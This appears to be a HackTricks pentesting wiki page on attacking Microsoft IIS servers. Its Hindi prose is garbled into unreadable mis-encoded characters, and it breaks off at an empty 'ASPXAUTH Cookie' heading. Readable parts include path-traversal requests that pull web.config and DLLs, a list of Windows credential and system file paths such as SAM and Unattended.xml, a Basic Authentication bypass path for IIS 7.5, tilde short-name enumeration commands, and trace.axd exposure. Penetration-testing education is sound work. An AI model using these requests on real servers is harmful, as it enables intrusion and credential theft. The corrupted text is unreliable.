# IIS - рдЗрдВрдЯрд░рдиреЗрдЯ рд╕реВрдЪрдирд╛ рд╕реЗрд╡рд╛рдПрдБ

{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдБ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* **рд╣рдорд╛рд░реЗ** ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ **рд╣рдорд╛рд░реЗ** **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВред**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдЧрд┐рдЯрд╣рдм рд░рд┐рдкреЛрдЬрд┐рдЯрд░реА рдореЗрдВ PR рд╕рдмрдорд┐рдЯ рдХрд░реЗрдВред

</details>
{% endhint %}

рдкрд░реАрдХреНрд╖рдг рдирд┐рд╖реНрдкрд╛рджрди рдпреЛрдЧреНрдп рдлрд╝рд╛рдЗрд▓ рдПрдХреНрд╕рдЯреЗрдВрд╢рди:

* asp
* aspx
* config
* php

## рдЖрдВрддрд░рд┐рдХ IP рдкрддрд╛ рд▓реАрдХ

рдХрд┐рд╕реА рднреА IIS рд╕рд░реНрд╡рд░ рдкрд░ рдЬрд╣рд╛рдБ рдЖрдкрдХреЛ 302 рдорд┐рд▓рддрд╛ рд╣реИ, рдЖрдк рд╣реЛрд╕реНрдЯ рд╣реЗрдбрд░ рдХреЛ рд╣рдЯрд╛рдиреЗ рдФрд░ HTTP/1.0 рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЗ рдЕрдВрджрд░ рд╕реНрдерд╛рди рд╣реЗрдбрд░ рдЖрдкрдХреЛ рдЖрдВрддрд░рд┐рдХ IP рдкрддреЗ рдХреА рдУрд░ рдЗрдВрдЧрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ:
```
nc -v domain.com 80
openssl s_client -connect domain.com:443
```
рдЖрдВрддрд░рд┐рдХ IP рдХрд╛ рдЦреБрд▓рд╛рд╕рд╛ рдХрд░рдиреЗ рд╡рд╛рд▓реА рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛:
```
GET / HTTP/1.0

HTTP/1.1 302 Moved Temporarily
Cache-Control: no-cache
Pragma: no-cache
Location: https://192.168.5.237/owa/
Server: Microsoft-IIS/10.0
X-FEServer: NHEXCHANGE2016
```
## Execute .config files

рдЖрдк .config рдлрд╝рд╛рдЗрд▓реЗрдВ рдЕрдкрд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЙрдирдХрд╛ рдЙрдкрдпреЛрдЧ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕реЗ рдХрд░рдиреЗ рдХрд╛ рдПрдХ рддрд░реАрдХрд╛ рдлрд╝рд╛рдЗрд▓ рдХреЗ рдЕрдВрдд рдореЗрдВ HTML рдЯрд┐рдкреНрдкрдгреА рдХреЗ рдЕрдВрджрд░ рдХреЛрдб рдЬреЛрдбрд╝рдирд╛ рд╣реИ: [Download example here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config)

рдЗрд╕ рднреЗрджреНрдпрддрд╛ рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдФрд░ рддрдХрдиреАрдХреЗрдВ [рдпрд╣рд╛рдБ](https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/) рд╣реИрдВред

## IIS Discovery Bruteforce

рдореИрдВрдиреЗ рдЬреЛ рд╕реВрдЪреА рдмрдирд╛рдИ рд╣реИ рдЙрд╕реЗ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ:

{% file src="../../.gitbook/assets/iisfinal.txt" %}

рдпрд╣ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реВрдЪрд┐рдпреЛрдВ рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЛ рдорд┐рд▓рд╛рдХрд░ рдмрдирд╛рдИ рдЧрдИ рдереА:

[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt)\
[http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html](http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html)\
[https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt](https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt)\
[https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt](https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt)

рдЗрд╕реЗ рдмрд┐рдирд╛ рдХрд┐рд╕реА рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЗ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ, рдЬрд┐рди рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдЗрд╕рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ, рдЙрдирдореЗрдВ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рд╣реИред

## Path Traversal

### Leaking source code

рдкреВрд░реНрдг рд▓реЗрдЦрди рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ: [https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html](https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html)

{% hint style="info" %}
рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ, рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рдлрд╝реЛрд▓реНрдбрд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдХрдИ web.config рдлрд╝рд╛рдЗрд▓реЗрдВ рд╣реИрдВ рдЬрд┐рдирдореЗрдВ "**assemblyIdentity**" рдлрд╝рд╛рдЗрд▓реЛрдВ рдФрд░ "**namespaces**" рдХреЗ рд╕рдВрджрд░реНрдн рд╣реИрдВред рдЗрд╕ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд╕рд╛рде рдпрд╣ рдЬрд╛рдирдирд╛ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ **executables рдХрд╣рд╛рдБ рд╕реНрдерд┐рдд рд╣реИрдВ** рдФрд░ рдЙрдиреНрд╣реЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВред\
**рдбрд╛рдЙрдирд▓реЛрдб рдХреА рдЧрдИ Dlls** рд╕реЗ рдпрд╣ рднреА рд╕рдВрднрд╡ рд╣реИ рдХрд┐ **рдирдП namespaces** рдЦреЛрдЬреЗрдВ рдЬрд╣рд╛рдБ рдЖрдкрдХреЛ рдкрд╣реБрдБрдЪрдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП рдФрд░ web.config рдлрд╝рд╛рдЗрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреА рдЪрд╛рд╣рд┐рдП рддрд╛рдХрд┐ рдирдП namespaces рдФрд░ assemblyIdentity рдорд┐рд▓ рд╕рдХреЗрдВред\
рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдлрд╝рд╛рдЗрд▓реЗрдВ **connectionstrings.config** рдФрд░ **global.asax** рджрд┐рд▓рдЪрд╕реНрдк рдЬрд╛рдирдХрд╛рд░реА рд░рдЦ рд╕рдХрддреА рд╣реИрдВред\\
{% endhint %}

**.Net MVC рдЕрдиреБрдкреНрд░рдпреЛрдЧреЛрдВ** рдореЗрдВ, **web.config** рдлрд╝рд╛рдЗрд▓ рдПрдХ рдорд╣рддреНрд╡рдкреВрд░реНрдг рднреВрдорд┐рдХрд╛ рдирд┐рднрд╛рддреА рд╣реИ, рдЬреЛ рдкреНрд░рддреНрдпреЗрдХ рдмрд╛рдЗрдирд░реА рдлрд╝рд╛рдЗрд▓ рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддреА рд╣реИ рдЬрд┐рд╕ рдкрд░ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИ **"assemblyIdentity"** XML рдЯреИрдЧ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗред

### **Exploring Binary Files**

**web.config** рдлрд╝рд╛рдЗрд▓ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХрд╛ рдПрдХ рдЙрджрд╛рд╣рд░рдг рдиреАрдЪреЗ рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ:
```markup
GET /download_page?id=..%2f..%2fweb.config HTTP/1.1
Host: example-mvc-application.minded
```
рдпрд╣ рдЕрдиреБрд░реЛрдз рд╡рд┐рднрд┐рдиреНрди рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдФрд░ рдирд┐рд░реНрднрд░рддрд╛рдУрдВ рдХреЛ рдкреНрд░рдХрдЯ рдХрд░рддрд╛ рд╣реИ, рдЬреИрд╕реЗ:

* **EntityFramework** рд╕рдВрд╕реНрдХрд░рдг
* **AppSettings** рд╡реЗрдмрдкреЗрдЬ, рдХреНрд▓рд╛рдЗрдВрдЯ рдорд╛рдиреНрдпрддрд╛, рдФрд░ JavaScript рдХреЗ рд▓рд┐рдП
* **System.web** рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдФрд░ рд░рдирдЯрд╛рдЗрдо рдХреЗ рд▓рд┐рдП рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди
* **System.webServer** рдореЙрдбреНрдпреВрд▓ рд╕реЗрдЯрд┐рдВрдЧреНрд╕
* **Runtime** рдЕрд╕реЗрдВрдмрд▓реА рдмрд╛рдЗрдВрдбрд┐рдВрдЧреНрд╕ рдХрдИ рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ рдХреЗ рд▓рд┐рдП рдЬреИрд╕реЗ **Microsoft.Owin**, **Newtonsoft.Json**, рдФрд░ **System.Web.Mvc**

рдпреЗ рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдпрд╣ рд╕рдВрдХреЗрдд рджреЗрддреА рд╣реИрдВ рдХрд┐ рдХреБрдЫ рдлрд╝рд╛рдЗрд▓реЗрдВ, рдЬреИрд╕реЗ **/bin/WebGrease.dll**, рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдХреЗ /bin рдлрд╝реЛрд▓реНрдбрд░ рдХреЗ рднреАрддрд░ рд╕реНрдерд┐рдд рд╣реИрдВред

### **рд░реВрдЯ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдлрд╝рд╛рдЗрд▓реЗрдВ**

рд░реВрдЯ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдореЗрдВ рдкрд╛рдИ рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рдлрд╝рд╛рдЗрд▓реЗрдВ, рдЬреИрд╕реЗ **/global.asax** рдФрд░ **/connectionstrings.config** (рдЬреЛ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдкрд╛рд╕рд╡рд░реНрдб рд░рдЦрддреА рд╣реИ), рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдХреА рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдФрд░ рд╕рдВрдЪрд╛рд▓рди рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╣реИрдВред

### **Namespaces рдФрд░ Web.Config**

MVC рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдЕрддрд┐рд░рд┐рдХреНрдд **web.config рдлрд╝рд╛рдЗрд▓реЗрдВ** рднреА рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рддреЗ рд╣реИрдВ рд╡рд┐рд╢рд┐рд╖реНрдЯ namespaces рдХреЗ рд▓рд┐рдП рддрд╛рдХрд┐ рдкреНрд░рддреНрдпреЗрдХ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рджреЛрд╣рд░рд╛рд╡рджрд╛рд░ рдШреЛрд╖рдгрд╛рдУрдВ рд╕реЗ рдмрдЪрд╛ рдЬрд╛ рд╕рдХреЗ, рдЬреИрд╕рд╛ рдХрд┐ рдПрдХ рдЕрдиреНрдп **web.config** рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рдЕрдиреБрд░реЛрдз рдХреЗ рд╕рд╛рде рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ:
```markup
GET /download_page?id=..%2f..%2fViews/web.config HTTP/1.1
Host: example-mvc-application.minded
```
### **DLLs рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛**

рдХрд╕реНрдЯрдо рдирд╛рдорд╕реНрдерд╛рди рдХрд╛ рдЙрд▓реНрд▓реЗрдЦ /bin рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рдореМрдЬреВрдж "**WebApplication1**" рдирд╛рдордХ DLL рдХреА рдУрд░ рдЗрд╢рд╛рд░рд╛ рдХрд░рддрд╛ рд╣реИред рдЗрд╕рдХреЗ рдмрд╛рдж, **WebApplication1.dll** рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЕрдиреБрд░реЛрдз рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ:
```markup
GET /download_page?id=..%2f..%2fbin/WebApplication1.dll HTTP/1.1
Host: example-mvc-application.minded
```
рдпрд╣ рдЕрдиреНрдп рдЖрд╡рд╢реНрдпрдХ DLLs рдХреА рдЙрдкрд╕реНрдерд┐рддрд┐ рдХрд╛ рд╕реБрдЭрд╛рд╡ рджреЗрддрд╛ рд╣реИ, рдЬреИрд╕реЗ **System.Web.Mvc.dll** рдФрд░ **System.Web.Optimization.dll**, /bin рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВред

рдПрдХ рдкрд░рд┐рджреГрд╢реНрдп рдореЗрдВ рдЬрд╣рд╛рдВ рдПрдХ DLL рдПрдХ рдирд╛рдорд╕реНрдерд╛рди рдЖрдпрд╛рдд рдХрд░рддрд╛ рд╣реИ рдЬрд┐рд╕реЗ **WebApplication1.Areas.Minded** рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЕрдиреНрдп web.config рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЗ рдЕрд╕реНрддрд┐рддреНрд╡ рдХрд╛ рдЕрдиреБрдорд╛рди рд▓рдЧрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рдкреВрд░реНрд╡рд╛рдиреБрдорд╛рдирд┐рдд рдкрдереЛрдВ рдореЗрдВ рд╣реИрдВ, рдЬреИрд╕реЗ **/area-name/Views/**, рдЬрд┐рд╕рдореЗрдВ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдФрд░ /bin рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рдЕрдиреНрдп DLLs рдХреЗ рд╕рдВрджрд░реНрдн рд╢рд╛рдорд┐рд▓ рд╣реИрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, **/Minded/Views/web.config** рдХреЗ рд▓рд┐рдП рдПрдХ рдЕрдиреБрд░реЛрдз рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдФрд░ рдирд╛рдорд╕реНрдерд╛рди рдкреНрд░рдХрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рдПрдХ рдЕрдиреНрдп DLL, **WebApplication1.AdditionalFeatures.dll** рдХреА рдЙрдкрд╕реНрдерд┐рддрд┐ рдХреЛ рдЗрдВрдЧрд┐рдд рдХрд░рддрд╛ рд╣реИред

### рд╕рд╛рдорд╛рдиреНрдп рдлрд╝рд╛рдЗрд▓реЗрдВ

[рдпрд╣рд╛рдВ рд╕реЗ](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
```
C:\Apache\conf\httpd.conf
C:\Apache\logs\access.log
C:\Apache\logs\error.log
C:\Apache2\conf\httpd.conf
C:\Apache2\logs\access.log
C:\Apache2\logs\error.log
C:\Apache22\conf\httpd.conf
C:\Apache22\logs\access.log
C:\Apache22\logs\error.log
C:\Apache24\conf\httpd.conf
C:\Apache24\logs\access.log
C:\Apache24\logs\error.log
C:\Documents and Settings\Administrator\NTUser.dat
C:\php\php.ini
C:\php4\php.ini
C:\php5\php.ini
C:\php7\php.ini
C:\Program Files (x86)\Apache Group\Apache\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache\logs\access.log
C:\Program Files (x86)\Apache Group\Apache\logs\error.log
C:\Program Files (x86)\Apache Group\Apache2\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache2\logs\access.log
C:\Program Files (x86)\Apache Group\Apache2\logs\error.log
c:\Program Files (x86)\php\php.ini"
C:\Program Files\Apache Group\Apache\conf\httpd.conf
C:\Program Files\Apache Group\Apache\conf\logs\access.log
C:\Program Files\Apache Group\Apache\conf\logs\error.log
C:\Program Files\Apache Group\Apache2\conf\httpd.conf
C:\Program Files\Apache Group\Apache2\conf\logs\access.log
C:\Program Files\Apache Group\Apache2\conf\logs\error.log
C:\Program Files\FileZilla Server\FileZilla Server.xml
C:\Program Files\MySQL\my.cnf
C:\Program Files\MySQL\my.ini
C:\Program Files\MySQL\MySQL Server 5.0\my.cnf
C:\Program Files\MySQL\MySQL Server 5.0\my.ini
C:\Program Files\MySQL\MySQL Server 5.1\my.cnf
C:\Program Files\MySQL\MySQL Server 5.1\my.ini
C:\Program Files\MySQL\MySQL Server 5.5\my.cnf
C:\Program Files\MySQL\MySQL Server 5.5\my.ini
C:\Program Files\MySQL\MySQL Server 5.6\my.cnf
C:\Program Files\MySQL\MySQL Server 5.6\my.ini
C:\Program Files\MySQL\MySQL Server 5.7\my.cnf
C:\Program Files\MySQL\MySQL Server 5.7\my.ini
C:\Program Files\php\php.ini
C:\Users\Administrator\NTUser.dat
C:\Windows\debug\NetSetup.LOG
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\php.ini
C:\Windows\repair\SAM
C:\Windows\repair\system
C:\Windows\System32\config\AppEvent.evt
C:\Windows\System32\config\RegBack\SAM
C:\Windows\System32\config\RegBack\system
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SecEvent.evt
C:\Windows\System32\config\SysEvent.evt
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\winevt\Logs\Application.evtx
C:\Windows\System32\winevt\Logs\Security.evtx
C:\Windows\System32\winevt\Logs\System.evtx
C:\Windows\win.ini
C:\xampp\apache\conf\extra\httpd-xampp.conf
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\xampp\FileZillaFTP\FileZilla Server.xml
C:\xampp\MercuryMail\MERCURY.INI
C:\xampp\mysql\bin\my.ini
C:\xampp\php\php.ini
C:\xampp\security\webdav.htpasswd
C:\xampp\sendmail\sendmail.ini
C:\xampp\tomcat\conf\server.xml
```
## HTTPAPI 2.0 404 Error

рдпрджрд┐ рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рддреНрд░реБрдЯрд┐ рджреЗрдЦрддреЗ рд╣реИрдВ:

![](<../../.gitbook/assets/image (446) (1) (2) (2) (3) (3) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (10) (2).png>)

рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рд╕рд░реНрд╡рд░ рдиреЗ **Host header** рдХреЗ рдЕрдВрджрд░ рд╕рд╣реА рдбреЛрдореЗрди рдирд╛рдо **рдирд╣реАрдВ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛**ред\
рд╡реЗрдм рдкреГрд╖реНрда рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдк рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рджрддреНрдд **SSL Certificate** рдХреЛ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╢рд╛рдпрдж рдЖрдк рд╡рд╣рд╛рдВ рдбреЛрдореЗрди/рд╕рдмрдбреЛрдореЗрди рдирд╛рдо рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред рдпрджрд┐ рдпрд╣ рд╡рд╣рд╛рдБ рдирд╣реАрдВ рд╣реИ, рддреЛ рдЖрдкрдХреЛ рд╕рд╣реА рдПрдХ рдХреЛ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП **VHosts рдХреЛ рдмреНрд░реВрдЯ рдлреЛрд░реНрд╕** рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛ рд╕рдХрддреА рд╣реИред

## Old IIS vulnerabilities worth looking for

### Microsoft IIS tilde character тАЬ\~тАЭ Vulnerability/Feature тАУ Short File/Folder Name Disclosure

рдЖрдк рдЗрд╕ **technique** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣рд░ рдЦреЛрдЬреЗ рдЧрдП рдлрд╝реЛрд▓реНрдбрд░ рдХреЗ рдЕрдВрджрд░ **рдлреЛрд▓реНрдбрд░реНрд╕ рдФрд░ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рд╕реВрдЪреАрдмрджреНрдз** рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рдпрджрд┐ рдпрд╣ Basic Authentication рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ)ред\
рдпрджрд┐ рд╕рд░реНрд╡рд░ рдХрдордЬреЛрд░ рд╣реИ, рддреЛ рдЗрд╕ рддрдХрдиреАрдХ рдХреА рдореБрдЦреНрдп рд╕реАрдорд╛ рдпрд╣ рд╣реИ рдХрд┐ **рдпрд╣ рдкреНрд░рддреНрдпреЗрдХ рдлрд╝рд╛рдЗрд▓/рдлрд╝реЛрд▓реНрдбрд░ рдХреЗ рдирд╛рдо рдХреЗ рдкрд╣рд▓реЗ 6 рдЕрдХреНрд╖рд░реЛрдВ рдФрд░ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЗ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЗ рдкрд╣рд▓реЗ 3 рдЕрдХреНрд╖рд░реЛрдВ рдХреЛ рд╣реА рдЦреЛрдЬ рд╕рдХрддрд╛ рд╣реИ**ред

рдЖрдк рдЗрд╕ рдХрдордЬреЛрд░реА рдХреЗ рд▓рд┐рдП [https://github.com/irsdl/IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:`java -jar iis_shortname_scanner.jar 2 20 http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db/`

![](<../../.gitbook/assets/image (844).png>)

рдореВрд▓ рд╢реЛрдз: [https://soroush.secproject.com/downloadable/microsoft\_iis\_tilde\_character\_vulnerability\_feature.pdf](https://soroush.secproject.com/downloadable/microsoft\_iis\_tilde\_character\_vulnerability\_feature.pdf)

рдЖрдк **metasploit** рдХрд╛ рднреА рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: `use scanner/http/iis_shortname_scanner`

### Basic Authentication bypass

**Bypass** рдПрдХ рдмреЗрд╕рд┐рдХ рдСрдереЗрдВрдЯрд┐рдХреЗрд╢рди (**IIS 7.5**) рдХреЛ рдПрдХреНрд╕реЗрд╕ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддреЗ рд╣реБрдП: `/admin:$i30:$INDEX_ALLOCATION/admin.php` рдпрд╛ `/admin::$INDEX_ALLOCATION/admin.php`

рдЖрдк рдирдП **рдлреЛрд▓реНрдбрд░реНрд╕** рдЦреЛрдЬрдиреЗ рдФрд░ рдСрдереЗрдВрдЯрд┐рдХреЗрд╢рди рдХреЛ **bypass** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕ **vulnerability** рдФрд░ рдкрд┐рдЫрд▓реЗ рд╡рд╛рд▓реЗ рдХреЛ **рдорд┐рд╢реНрд░рд┐рдд** рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

## ASP.NET Trace.AXD enabled debugging

ASP.NET рдореЗрдВ рдПрдХ рдбрд┐рдмрдЧрд┐рдВрдЧ рдореЛрдб рд╢рд╛рдорд┐рд▓ рд╣реИ рдФрд░ рдЗрд╕рдХрд╛ рдлрд╝рд╛рдЗрд▓ рдирд╛рдо `trace.axd` рд╣реИред

рдпрд╣ рдПрдХ рдирд┐рд╢реНрдЪрд┐рдд рд╕рдордп рдЕрд╡рдзрд┐ рдореЗрдВ рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рд▓рд┐рдП рдХрд┐рдП рдЧрдП рд╕рднреА рдЕрдиреБрд░реЛрдзреЛрдВ рдХрд╛ рдмрд╣реБрдд рд╡рд┐рд╕реНрддреГрдд рд▓реЙрдЧ рд░рдЦрддрд╛ рд╣реИред

рдЗрд╕ рдЬрд╛рдирдХрд╛рд░реА рдореЗрдВ рджреВрд░рд╕реНрде рдХреНрд▓рд╛рдЗрдВрдЯ IP, рд╕рддреНрд░ рдЖрдИрдбреА, рд╕рднреА рдЕрдиреБрд░реЛрдз рдФрд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреБрдХреАрдЬрд╝, рднреМрддрд┐рдХ рдкрде, рд╕реНрд░реЛрдд рдХреЛрдб рдХреА рдЬрд╛рдирдХрд╛рд░реА, рдФрд░ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рднреА рд╢рд╛рдорд┐рд▓ рд╣реЛрддреЗ рд╣реИрдВред

[https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/](https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/)

![Screenshot 2021-03-30 at 13 19 11](https://user-images.githubusercontent.com/31736688/112974448-2690b000-915b-11eb-896c-f41c27c44286.png)

## ASPXAUTH Cookie

